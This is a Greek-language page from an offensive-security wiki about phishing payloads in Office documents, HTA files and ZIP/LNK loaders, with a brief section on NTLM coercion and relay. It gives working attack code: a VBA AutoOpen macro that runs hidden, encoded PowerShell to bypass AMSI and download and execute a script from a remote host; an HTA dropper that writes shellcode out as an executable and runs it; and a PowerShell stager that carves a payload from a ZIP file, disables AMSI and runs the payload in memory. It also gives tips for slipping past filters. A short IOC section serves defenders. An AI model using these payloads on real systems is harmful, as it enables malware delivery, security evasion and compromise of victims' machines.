# Phishing Αρχεία & Έγγραφα

{{#include ../../banners/hacktricks-training.md}}

## Έγγραφα Office

Το Microsoft Word εκτελεί επικύρωση δεδομένων αρχείου πριν ανοίξει ένα αρχείο. Η επικύρωση δεδομένων γίνεται με τη μορφή ταυτοποίησης της δομής δεδομένων, σύμφωνα με το πρότυπο OfficeOpenXML. Εάν προκύψει οποιοδήποτε σφάλμα κατά την ταυτοποίηση της δομής δεδομένων, το αρχείο που αναλύεται δεν θα ανοίξει.

Συνήθως, αρχεία Word που περιέχουν macros χρησιμοποιούν την κατάληξη `.docm`. Ωστόσο, είναι δυνατόν να μετονομαστεί το αρχείο αλλάζοντας την επέκταση και να διατηρήσει παράλληλα τη δυνατότητα εκτέλεσης των macros.\
Για παράδειγμα, ένα αρχείο RTF δεν υποστηρίζει macros, κατά σχεδιασμό, αλλά ένα αρχείο DOCM μετονομασμένο σε RTF θα χειριστείται από το Microsoft Word και θα είναι ικανό για εκτέλεση macros.\
Οι ίδιες εσωτερικές λειτουργίες και μηχανισμοί εφαρμόζονται σε όλο το λογισμικό του Microsoft Office Suite (Excel, PowerPoint etc.).

Μπορείτε να χρησιμοποιήσετε την ακόλουθη εντολή για να ελέγξετε ποιες επεκτάσεις πρόκειται να εκτελεστούν από κάποια προγράμματα Office:
```bash
assoc | findstr /i "word excel powerp"
```
Τα αρχεία DOCX που αναφέρονται σε ένα απομακρυσμένο πρότυπο (File –Options –Add-ins –Manage: Templates –Go) που περιλαμβάνει macros μπορούν επίσης να εκτελέσουν macros.

### Φόρτωση Εξωτερικής Εικόνας

Μεταβείτε σε: _Insert --> Quick Parts --> Field_\
_**Categories**: Σύνδεσμοι και Αναφορές, **Filed names**: includePicture, και **Όνομα αρχείου ή URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Είναι δυνατό να χρησιμοποιηθούν macros για να run arbitrary code από το έγγραφο.

#### Autoload functions

Όσο πιο συνηθισμένες είναι, τόσο πιο πιθανό είναι το AV να τις εντοπίσει.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Αφαίρεση μεταδεδομένων χειροκίνητα

Πήγαινε στο **File > Info > Inspect Document > Inspect Document**, το οποίο θα εμφανίσει το Document Inspector. Κάνε κλικ στο **Inspect** και μετά στο **Remove All** δίπλα από τα **Document Properties and Personal Information**.

#### Doc Extension

Όταν τελειώσεις, επίλεξε το dropdown **Save as type**, άλλαξε τη μορφή από **`.docx`** σε **Word 97-2003 `.doc`**.\
Κάνε αυτό επειδή **δεν μπορείς να αποθηκεύσεις μακροεντολές μέσα σε `.docx`** και υπάρχει ένα **στίγμα** **σχετικά** με την επέκταση ενεργοποιημένων μακροεντολών **`.docm`** (π.χ. το εικονίδιο μικρογραφίας έχει ένα τεράστιο `!` και κάποια web/email gateway τα μπλοκάρουν εντελώς). Επομένως, αυτή η **παλαιά επέκταση `.doc` είναι ο καλύτερος συμβιβασμός**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Αρχεία HTA

Ένα HTA είναι ένα πρόγραμμα Windows που **συνδυάζει HTML και scripting languages (όπως VBScript και JScript)**. Δημιουργεί το περιβάλλον χρήστη και εκτελείται ως εφαρμογή «πλήρως αξιόπιστη», χωρίς τους περιορισμούς του μοντέλου ασφάλειας ενός browser.

Ένα HTA εκτελείται χρησιμοποιώντας **`mshta.exe`**, το οποίο συνήθως είναι **εγκατεστημένο** μαζί με τον **Internet Explorer**, καθιστώντας **`mshta` εξαρτώμενο από τον IE**. Έτσι, αν αυτός έχει απεγκατασταθεί, τα HTA δεν θα μπορούν να εκτελεστούν.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Εξαναγκασμός NTLM authentication

Υπάρχουν αρκετοί τρόποι να **εξαναγκάσετε NTLM authentication "απομακρυσμένα"**, για παράδειγμα, μπορείτε να προσθέσετε **αόρατες εικόνες** σε emails ή HTML που ο χρήστης θα προσπελάσει (ακόμη και HTTP MitM?). Ή να στείλετε στο θύμα τη **διεύθυνση αρχείων** που θα **προκαλέσει** μια **authentication** απλώς με το **άνοιγμα του φακέλου.**

**Ελέγξτε αυτές τις ιδέες και περισσότερα στις παρακάτω σελίδες:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Μην ξεχνάτε ότι δεν μπορείτε μόνο να κλέψετε το hash ή την authentication αλλά και να **εκτελέσετε NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Οι ιδιαίτερα αποτελεσματικές καμπάνιες παραδίδουν ένα ZIP που περιέχει δύο νόμιμα παραπλανητικά έγγραφα (PDF/DOCX) και ένα κακόβουλο .lnk. Το κόλπο είναι ότι ο πραγματικός PowerShell loader αποθηκεύεται μέσα στα raw bytes του ZIP μετά από ένα μοναδικό marker, και το .lnk τον εξάγει και τον τρέχει πλήρως στη μνήμη.

Τυπική ροή που υλοποιείται από το .lnk PowerShell one-liner:

1) Εντοπίστε το αρχικό ZIP σε κοινές τοποθεσίες: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, και τον parent of the current working directory.  
2) Διαβάστε τα ZIP bytes και βρείτε ένα hardcoded marker (π.χ., xFIQCV). Όλα όσα ακολουθούν το marker είναι το embedded PowerShell payload.  
3) Αντιγράψτε το ZIP στο %ProgramData%, εξάγετε εκεί, και ανοίξτε το decoy .docx για να φαίνεται νόμιμο.  
4) Παρακάμψτε το AMSI για τη τρέχουσα διαδικασία: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) Deobfuscate το επόμενο στάδιο (π.χ., αφαιρέστε όλους τους χαρακτήρες #) και εκτελέστε το στη μνήμη.

Παράδειγμα PowerShell skeleton για να carve και να τρέξετε το embedded στάδιο:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Σημειώσεις
- Η παράδοση συχνά καταχράται αξιόπιστα υποτομείς PaaS (π.χ., *.herokuapp.com) και μπορεί να περιορίζει τα payloads (σερβίροντας benign ZIPs βάσει IP/UA).
- Το επόμενο στάδιο συχνά αποκρυπτογραφεί base64/XOR shellcode και το εκτελεί μέσω Reflection.Emit + VirtualAlloc για να ελαχιστοποιήσει τα ίχνη στο δίσκο.

Persistence που χρησιμοποιείται στην ίδια αλυσίδα
- COM TypeLib hijacking του Microsoft Web Browser control έτσι ώστε το IE/Explorer ή οποιαδήποτε εφαρμογή που το ενσωματώνει να επανεκκινεί το payload αυτόματα. Δείτε λεπτομέρειες και έτοιμες εντολές εδώ:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP αρχεία που περιέχουν την ASCII marker συμβολοσειρά (π.χ., xFIQCV) προσαρτημένη στα δεδομένα του αρχείου.
- .lnk που απαριθμεί parent/user φακέλους για να εντοπίσει το ZIP και ανοίγει ένα decoy document.
- AMSI παραποίηση μέσω [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Μακροχρόνιες business threads που τελειώνουν με links hosted under trusted PaaS domains.

## Αναφορές

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
